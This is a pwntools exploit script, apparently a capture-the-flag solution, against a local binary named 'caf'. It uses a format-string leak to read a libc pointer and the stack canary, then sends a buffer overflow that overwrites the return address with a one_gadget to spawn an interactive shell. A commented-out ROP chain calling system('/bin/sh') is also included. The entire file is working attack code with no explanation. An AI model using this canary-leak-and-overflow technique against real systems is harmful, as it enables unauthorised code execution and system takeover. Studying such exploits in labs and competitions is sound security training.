from pwn import *

context(terminal = ["tmux","splitw","-h"], os="linux", arch ="amd64")
proc = process("./caf")
libc = proc.libc
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
proc.recv()
payload = b"%p "*39
proc.sendline(payload)
All = proc.recv()
Leak = eval(All[30:30+14].decode())
Canary = int(All[462:462+18].decode(), 16)
log.info("Leak: "+ hex(Leak))
log.info("Canary: "+ hex(Canary))
#gdb.attach(proc)
#libc.address = Leak - libc.sym['_IO_2_1_stdin_']
log.info("Libc address: "+ hex(libc.address))
#payload =b"X"*264+p64(Canary)+p64(0) + p64(libc.address + 0x25679) + p64(libc.address + 0x26b72) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.address + 0x27529) + p64(0)+ p64(libc.sym["system"])
payload = b"X"*264+p64(Canary)+p64(0)+p64(libc.address + 0xe6c81)
proc.sendline(payload)
proc.interactive()
